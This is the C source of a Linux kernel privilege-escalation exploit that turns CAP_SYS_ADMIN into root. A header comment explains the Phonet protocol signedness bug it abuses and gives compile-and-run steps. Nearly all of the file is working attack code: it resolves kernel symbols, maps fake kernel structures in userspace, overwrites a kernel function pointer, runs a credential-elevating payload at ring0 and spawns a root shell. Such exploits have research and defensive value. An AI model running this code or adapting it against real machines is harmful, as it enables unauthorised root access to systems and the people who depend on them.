/*
 * Linux Kernel CAP_SYS_ADMIN to root exploit
 * by Dan Rosenberg
 * @djrbliss on twitter
 *
 * Usage:
 * gcc -w caps-to-root.c -o caps-to-root
 * sudo setcap cap_sys_admin+ep caps-to-root
 * ./caps-to-root
 *
 * This exploit is NOT stable:
 *
 *  * It only works on 32-bit x86 machines
 *
 *  * It only works on >= 2.6.34 kernels (it could probably be ported back, but
 *    it involves winning a race condition)
 *
 *  * It requires symbol support for symbols that aren't included by default in
 *    several distributions
 *
 *  * It requires the Phonet protocol, which may not be compiled on some
 *    distributions
 *
 *  * You may experience problems on multi-CPU systems
 *
 * It has been tested on a stock Ubuntu 10.10 installation.  I wouldn't be
 * surprised if it doesn't work on other distributions.
 *
 * ----
 *
 * Lately there's been a lot of talk about how a large subset of Linux
 * capabilities are equivalent to root.  CAP_SYS_ADMIN is a catch-all
 * capability that, among other things, allows mounting filesystems and
 * injecting commands into an administrator's shell - in other words, it
 * trivially allows you to get root.  However, I found another way to get root
 * from CAP_SYS_ADMIN...the hard way.
 *
 * This exploit leverages a signedness error in the Phonet protocol.  By
 * specifying a negative protocol index, I can craft a series of fake
 * structures in userspace and cause the incrementing of an arbitrary kernel
 * address, which I then leverage to execute arbitrary kernel code.
 *
 * Greets to spender, cloud, jono, kees, pipacs, redpig, taviso, twiz, stealth,
 * and bla.
 *
 */

#include <stdio.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <linux/capability.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <unistd.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int getroot(void)
{
        
        commit_creds(prepare_kernel_cred(0));
        return 0;       

}

int konami(void)
{

        /* Konami code! */
        asm("inc %edx;"         /* UP */
            "inc %edx;"         /* UP */
            "dec %edx;"         /* DOWN */
            "dec %edx;"         /* DOWN */
            "shl %edx;"         /* LEFT */
            "shr %edx;"         /* RIGHT */
            "shl %edx;"         /* LEFT */
            "shr %edx;"         /* RIGHT */
            "push %ebx;"        /* B */
            "pop %ebx;"
            "push %eax;"        /* A */
            "pop %eax;"
            "mov $getroot, %ebx;"
            "call *%ebx;");     /* START */

        return 0;
}

/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
        FILE *f;
        unsigned long addr;
        char dummy;
        char sname[512];
        struct utsname ver;
        int ret;
        int rep = 0;
        int oldstyle = 0;

        f = fopen("/proc/kallsyms", "r");
        if (f == NULL) {
                f = fopen("/proc/ksyms", "r");
                if (f == NULL)
                        return 0;
                oldstyle = 1;
        }

        while(ret != EOF) {
                if (!oldstyle)
                        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
                else {
                        ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
                        if (ret == 2) {
                                char *p;
                                if (strstr(sname, "_O/") || strstr(sname, "_S."))
                                        continue;
                                p = strrchr(sname, '_');
                                if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
                                        p = p - 4;
                                        while (p > (char *)sname && *(p - 1) == '_')
                                                p--;
                                        *p = '\0';
                                }
                        }
                }
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        fprintf(stdout, " [+] Resolved %s to %p\n", name, (void *)addr);
                        fclose(f);
                        return addr;
                }
        }

        fclose(f);
        return 0;
}

int main(int argc, char * argv[])
{

        int sock, proto, i, offset = -1;
        unsigned long proto_tab, landing, target, pn_ops, pn_ioctl, *ptr;
        void * map;
        
        /* Create a socket to load the module for symbol support */
        printf("[*] Testing Phonet support and CAP_SYS_ADMIN...\n");
        sock = socket(PF_PHONET, SOCK_DGRAM, 0);

        if(sock < 0) {
                if(errno == EPERM)
                        printf("[*] You don't have CAP_SYS_ADMIN.\n");

                else
                        printf("[*] Failed to open Phonet socket.\n");
                
                return -1;
        }

        /* Resolve kernel symbols */
        printf("[*] Resolving kernel symbols...\n");

        proto_tab = get_kernel_sym("proto_tab");
        pn_ops = get_kernel_sym("phonet_dgram_ops");
        pn_ioctl = get_kernel_sym("pn_socket_ioctl");
        commit_creds = get_kernel_sym("commit_creds");
        prepare_kernel_cred = get_kernel_sym("prepare_kernel_cred");

        if(!proto_tab || !commit_creds || !prepare_kernel_cred ||
           !pn_ops || !pn_ioctl) {
                printf("[*] Failed to resolve kernel symbols.\n");
                return -1;
        }

        /* Thanks bla, for reminding me how to do basic math */
        landing = 0x20000000;
        proto = 1 << 31 | (landing - proto_tab) >> 2;

        /* Map it */
        printf("[*] Preparing fake structures...\n");

        map = mmap((void *)landing, 0x10000,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
        
        if(map == MAP_FAILED) {
                printf("[*] Failed to map landing area.\n");
                return -1;
        }
        
        /* Pointer to phonet_protocol struct */
        ptr = (unsigned long *)landing;
        ptr[0] = &ptr[1];

        /* phonet_protocol struct */
        for(i = 1; i < 4; i++)
                ptr[i] = &ptr[4];

        /* proto struct */
        for(i = 4; i < 204; i++)
                ptr[i] = &ptr[204];

        /* First, do a test run to calculate any offsets */
        target = 0x30000000;

        /* module struct */
        for(i = 204; i < 404; i++)
                ptr[i] = target;
        
        /* Map it */
        map = mmap((void *)0x30000000, 0x2000000,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
        
        if(map == MAP_FAILED) {
                printf("[*] Failed to map landing area.\n");
                return -1;
        }

        printf("[*] Calculating offsets...\n");

        socket(PF_PHONET, SOCK_DGRAM, proto);
        
        ptr = 0x30000000;
        for(i = 0; i < 0x800000; i++) {
                if(ptr[i] != 0) {
                        offset = i * sizeof(void *);
                        break;
                }
        }

        if(offset == -1) {
                printf("[*] Test run failed.\n");
                return -1;
        }

        /* MSB of pn_ioctl */
        target = pn_ops + 10 * sizeof(void *) - 1 - offset;
        
        /* Re-fill the module struct */
        ptr = (unsigned long *)landing;
        for(i = 204; i < 404; i++)
                ptr[i] = target;
        
        /* Push pn_ioctl fptr into userspace */
        printf("[*] Modifying function pointer...\n");

        landing = pn_ioctl;     
        while((landing & 0xff000000) != 0x10000000) {
                socket(PF_PHONET, SOCK_DGRAM, proto);
                landing += 0x01000000;
        }

        /* Map it */
        map = mmap((void *)(landing & ~0xfff), 0x10000,
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
        
        if(map == MAP_FAILED) {
                printf("[*] Failed to map payload area.\n");
                return -1;
        }

        /* Copy payload */
        memcpy((void *)landing, &konami, 1024);

        printf("[*] Executing Konami code at ring0...\n");
        ioctl(sock, 0, NULL);

        if(getuid()) {
                printf("[*] Exploit failed to get root.\n");
                return -1;
        }

        printf("[*] Konami code worked!  Have a root shell.\n");
        execl("/bin/sh", "/bin/sh", NULL);

}
